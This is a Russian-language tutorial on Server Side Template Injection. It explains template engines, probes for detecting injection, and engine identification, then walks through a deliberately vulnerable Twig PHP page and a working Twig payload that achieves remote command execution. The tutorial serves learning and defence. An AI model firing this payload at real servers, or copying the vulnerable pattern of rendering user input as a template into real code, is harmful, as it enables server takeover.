![[Pasted image 20230212132851.png]]

Есть такой вид атак, как Template Injection (Внедрение шаблона). Данный вид атак делится на два вида: Server Side Template Injection (SSTI) и Client Side Template Injection(CSTI). В данной статье мы рассмотрим SSTI, а в следующей — CSTI.

# Введение

Шаблоны веб-приложения - это предварительно созданные или кастомизированные файлы, которые определяют структуру и внешний вид содержимого веб-страницы. Они могут содержать HTML, CSS, JavaScript код, а также специфические для конкретного шаблонизатора инструкции и переменные.

Шаблонизаторы - это инструменты или библиотеки, которые используются для управления шаблонами веб-приложения. Они позволяют создавать динамические страницы, подставлять переменные, циклы, условия и другие конструкции, облегчая работу разработчикам и улучшая поддерживаемость кода.

Шаблонизаторы помогают разделять содержание и логику веб-приложения, что делает процесс разработки более организованным и эффективным. Некоторые популярные шаблонизаторы включают Handlebars, Mustache, Pug, EJS и другие.

Пример статического шаблона на HTML без использования шаблонизатора:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Пример</title>
</head>
<body>
    <h1>Добро пожаловать, {{username}}!</h1>
</body>
</html>
```


Пример динамического шаблона на EJS (Embedded JavaScript):

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Пример</title>
</head>
<body>
    <h1>Добро пожаловать, <%= username %>!</h1>
</body>
</html>
```


В данном примере EJS шаблонизатор использован, чтобы вставить значение переменной username в HTML страницу. Это позволяет динамически изменять содержимое страницы, в зависимости от значений переменных и данных, передаваемых в шаблон.

Пример шаблона на Ruby с использованием шаблонизатора ERB (Embedded Ruby):

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Пример</title>
</head>
<body>
    <h1>Добро пожаловать, <%= @username %>!</h1>
</body>
</html>
```

В данном примере переменная @username будет вставлена в HTML страницу при использовании ERB шаблонизатора в Ruby.

Пример шаблона на Python с использованием шаблонизатора Jinja2:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Пример</title>
</head>
<body>
    <h1>Добро пожаловать, {{ username }}!</h1>
</body>
</html>
```


Здесь переменная username будет вставлена в HTML страницу при использовании шаблонизатора Jinja2 в Python используя фреймворк Flask или Django.


Для разделения бизнес-логики (логика, которая получает и обрабатывает данные) и представления данных (логика, которая показывает данные пользователю), в современных веб-приложениях часто используются шаблонизаторы. То есть шаблонизаторы (в вебе) используются для того, чтобы отделить HTML код(представление данных) от кода языка, ответственного за бизнес-логику (PHP, Java, Python, Ruby/Rails, Perl, JavaScript). Что же такое шаблон? Шаблон – это файл, содержащий HTML и некоторые маркеры, позволяющий этот шаблон обработать и сформировать на его основе конечный HTML код.

Из-за чего возникают уязвимость SSTI? Конечно же, из-за неверной обработки пользовательских данных. В отличии от XSS (с которой SSTI очень легко спутать), Template Injection можно использовать для получения удаленного выполнения команд (RCE).  
Но об этом ниже.

Простой маленький пример: предположим, что у нас есть приложение, которое на основе пользовательского ввода, отправляет email с определенным содержанием. Например, представим, что пользователь должен ввести своё имя и в ответ ему придёт email, с его именем:

```
$output = $twig->render($_GET['custom_email'], array("first_name" => $user.first_name) );    
```

В данном примере пользователь контролирует содержимое шаблона вручную через GET-параметр «custom_email».

Смотрим далее:  
```    
custom_email={{7*7}}  
49      

custom_email={{self}}   
Object of class __TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string   
```  

Что мы здесь видим? Явное исполнение кода(на стороне сервера) внутри песочницы. В зависимости от используемого шаблонизатора, может стать возможным побег из песочницы и выполнение произвольного кода.

Уязвимость часто возникает из-за того, что разработчики дают возможность пользователю изменять шаблон (некоторые шаблонизаторы предлагают безопасный режим для этих целей).  
Все функции, которые используют данные введенные пользователем, могут быть уязвимы, в том числе вики-страницы, ревью и комментарии. Также, причиной уязвимости может быть то, что пользовательские данные вставляются непосредственно в шаблон.




# Обнаружение SSTI

Итак, есть два способа использования введённых пользователем данных.

## Первый способ:

пользовательский ввод помещается в шаблонное выражение.  

```
$output = $twig->render(**$_GET['smarty']**, array("first_name" => $user.first_name) );     
```

И предположим,  что пользователь передаёт следующий параметр:  

```
smarty=Hello 
```

Ответ:  
```
Hello
```

Для обнаружения SSTI нам нужно внедрить какое-нибудь выражение. Да, шаблонизаторов много, но почти все из них имеют одинаковый базовый синтаксис. Так что если мы передадим в качестве параметра:  

```
smarty=Hello ${7*7}
```

то получим в ответ:  
```
Hello 49 
```

## Второй способ: 

пользовательский ввод может быть помещён внутри шаблонного выражения, как правило, в качестве имени переменной.  

```
personal_greeting=username 
Hello user01    
```

Изменение имени переменной (_username_) вернёт либо пустой результат, либо сообщение об ошибке. Обнаружить это немного сложней: сначала отправляем серверу имя переменной вместе с каким-нибудь тегом, а потом пытаемся выйти за пределы кода.  

```
personal_greeting=username<tag>   
Hello
```


```
personal_greeting=username}}<tag>  
Hello user01 <tag>    
```




# Идентификация

После обнаружения  SSTI, мы должны выяснить, какой шаблонизатор используется. Сделать это очень просто, так как есть готовая схема для этой цели. Этот процесс выглядит [так](https://1.bp.blogspot.com/-txouq1ZZJw4/Vayv3Np5VGI/AAAAAAAAAFY/6zY9F6SFSEY/s640/Screen%2BShot%2B2015-07-20%2Bat%2B09.21.56.png):

![1](https://defcon.ru/wp-content/uploads/2016/11/1.png)

![[Pasted image 20230212133500.png]]


Нам всего-то нужно подставлять конкретные выражения и следить за ответом сервера. В некоторых случаях одно выражаение может приводить к разным ответам сервера (в зависимость от того, какой шаблонизатор используется). Например, {{7*’7′}} вернёт _49_, если используется Twig, _7777777_, если используется Jinja2 и не вернёт ничего, если шаблонизатор не используется.




# Эксплуатация

После того, как мы выяснили какой шаблонизатор используется, следующий наш шаг — чтение документации. Вот ключевые области на которые стоит обратить внимание:

-   раздел «For Template Authors» описывает базовый синтаксис;
-   «Security Considerations» — есть огромный шанс, что разработчики не читали данный раздел;
-   список встроеных функций, методов, переменных;
-   список дополнений/расширений — некоторый из них могут быть включены по умолчанию.

В том случае, если в документации не будет говориться о встроенных переменных, то нам придётся их брутить. Нужные словари находятся в Burp Intruder и [FuzzDB.](https://github.com/fuzzdb-project/fuzzdb)




# Практика

Давайте теперь рассмотрим один пример на практике. В качестве подопытного мы возьмём Twig.

Twig — это популярный шаблонизатор PHP. Итак, для демонстрации атаки, я использовал php файл со следующим содержанием (обратите внимание на то, что вам нужно установить и подключить Twig):

```
<html>
<head>
<title>Server Side Template injection - TWIG</title>
</head>
<body>
<?php
if (isset($_GET['name'])) {
$name=$_GET['name'];
include 'vendor/twig/twig/lib/Twig/Autoloader.php';
Twig_Autoloader::register();

try {
$loader = new Twig_Loader_String();
$twig = new Twig_Environment($loader);
$result= $twig->render($name);
echo "Hello $result";

} catch (Exception $e) {
die ('ERROR: ' . $e->getMessage());
}
}

?>

</body>
</html>
```

Параметр _name_ отображается в браузере. Присвоим параметру _name_ значение _DEFCON:_

![[Pasted image 20230212133634.png]]

Ага, всё работает, но давайте передадим _{{9*9}}_ в качестве значения:

![[Pasted image 20230212133658.png]]

А вот и SSTI :) Пришла очередь документации.

Через 30 секунд поиска находим список глобальных переменных, которые всегда доступны в шаблоне, и среди них есть обьект `__self:

![[Pasted image 20230212133730.png]]

Документация говорит, что Twig имеет обьект __self,_ который имеет атрибут _env_ (является ссылкой на Twig_Evironment).В процессе чтения документации, мы приходим к рабочей полезной нагрузке _{{_self.env.registerUndefinedFilterCallback(«exec»)}}{{_self.env.getFilter(«id»)}}_

Сначала мы регистрируем _exec_, а потом вызываем системную комманду _id:_

![[Pasted image 20230212133756.png]]

Вот мы и получили RCE :) Для автоматического обнаружения SSTI существует инструмент [TPLMap](https://github.com/epinna/tplmap).

А вот [отчёт](https://hackerone.com/reports/125980) на HackerOne, где иследователю удалось найти SSTI в Uber.

# Выводы

Уязвимость SSTI действительно очень опасная, так как с её помощью мы можем добиться RCE. Обнаружить уязвимость очень просто (хотя часто её можно перепутать с XSS), а вот поиск/разработка полезной нагрузки  — очень трудоёмкий процесс (правда, не во всех случаях). Кстати, для этой цели, на Github есть отличная [шпаргалка](https://gist.github.com/quantumfoam/fec4ab9083133523f489).